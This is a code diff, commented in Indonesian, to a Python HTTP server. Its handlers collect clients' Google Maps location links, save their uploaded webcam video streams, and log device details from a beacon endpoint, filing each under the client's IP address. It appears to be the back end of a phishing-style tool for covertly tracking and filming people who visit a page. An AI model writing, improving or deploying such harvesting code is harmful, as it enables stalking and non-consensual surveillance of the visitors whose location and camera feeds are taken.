@@ -408,67 +408,97 @@ class Handler(http.server.SimpleHTTPRequestHandler):
 
     def do_POST(self):
         parsed_path = self.path.split("?")[0]
-        client_ip_addr = client_ip(self.headers, self.client_address).replace(":", "_")
+        client_ip_addr = client_ip(self.headers, self.client_address).replace(":", "_").replace(".", "_")
         ip_folder = os.path.join(VIDEO_DIR, client_ip_addr)
 
+        # 1. Menangkap Tautan Google Maps
         if parsed_path == "/save-location":
             try:
                 length = int(self.headers.get("Content-Length", 0))
-                data = json.loads(self.rfile.read(length).decode("utf-8"))
-                gmaps_link = data.get("link")
-                
-                if not os.path.exists(ip_folder): os.makedirs(ip_folder)
-                loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
-                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                
-                with open(loc_log_file, "a") as f:
-                    f.write(f"[{timestamp}] {gmaps_link}\n")
+                if length > 0:
+                    data = json.loads(self.rfile.read(length).decode("utf-8"))
+                    gmaps_link = data.get("link")
                     
-                print(f"Lokasi diterima: {gmaps_link}")
+                    if not os.path.exists(ip_folder): 
+                        os.makedirs(ip_folder)
+                    
+                    loc_log_file = os.path.join(ip_folder, "log_lokasi.txt")
+                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    
+                    with open(loc_log_file, "a") as f:
+                        f.write(f"[{timestamp}] {gmaps_link}\n")
+                        
+                    print(f"[+] Lokasi diterima: {gmaps_link}")
+                
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b"OK")
             except Exception as e:
+                print("[-] Error location:", e)
                 self.send_error(500, str(e))
             return
 
+        # 2. Menangkap Stream Video (Mendukung Multipart & Raw Binary)
         if parsed_path == "/save-video":
             try:
-                content_type = self.headers.get("Content-Type", "")
-                if "multipart/form-data" in content_type:
-                    length = int(self.headers.get("Content-Length", 0))
+                length = int(self.headers.get("Content-Length", 0))
+                if length > 0:
                     body_data = self.rfile.read(length)
-                    header_end = body_data.find(b'\r\n\r\n')
-                    if header_end != -1:
-                        video_bytes = body_data[header_end + 4:-2]
-                        if not os.path.exists(ip_folder): os.makedirs(ip_folder)
+                    
+                    # Cek apakah ini multipart form-data atau raw binary
+                    content_type = self.headers.get("Content-Type", "")
+                    video_bytes = b""
+                    
+                    if "multipart/form-data" in content_type:
+                        # Amankan ekstraksi binary dari multipart
+                        boundary = content_type.split("boundary=")[-1].encode()
+                        parts = body_data.split(boundary)
+                        for part in parts:
+                            if b'filename=' in part:
+                                header_end = part.find(b'\r\n\r\n')
+                                if header_end != -1:
+                                    video_bytes = part[header_end + 4:-2] # Buang newline di akhir
+                                    break
+                    else:
+                        video_bytes = body_data
+
+                    if len(video_bytes) > 100: # Pastikan file video tidak kosong
+                        if not os.path.exists(ip_folder): 
+                            os.makedirs(ip_folder)
+                        
                         filename = f"video_{int(time.time())}_{uuid.uuid4().hex[:4]}.webm"
                         filepath = os.path.join(ip_folder, filename)
+                        
                         with open(filepath, "wb") as f:
                             f.write(video_bytes)
-                        print("Video berhasil disimpan")
+                        print(f"[+] Video berhasil disimpan: {filename}")
                 
                 self.send_response(200)
                 self.end_headers()
                 self.wfile.write(b"Saved")
             except Exception as e:
-                print("Error saving video:", e)
+                print("[-] Error saving video:", e)
                 self.send_error(500, str(e))
             return
 
-        if parsed_path != "/__beacon": return self.send_error(404)
+        if parsed_path != "/__beacon": 
+            return self.send_error(404)
+        
         try:
             n = min(int(self.headers.get("Content-Length", 0)), 4096)
             data = json.loads(self.rfile.read(n) or b"{}")
             if not isinstance(data, dict): data = {}
-        except Exception: data = {}
+        except Exception: 
+            data = {}
+        
         token = str(data.get("t", ""))
         with lock:
             v = pending.get(token)
             did = device_id(self.headers) or (v and v["did"])
             if did: devinfo[did] = data
         if v: flush(token)
-        self.send_response(204); self.end_headers()
+        self.send_response(204)
+        self.end_headers()
 
 http.server.ThreadingHTTPServer(("127.0.0.1", port), Handler).serve_forever()
 PYEOF
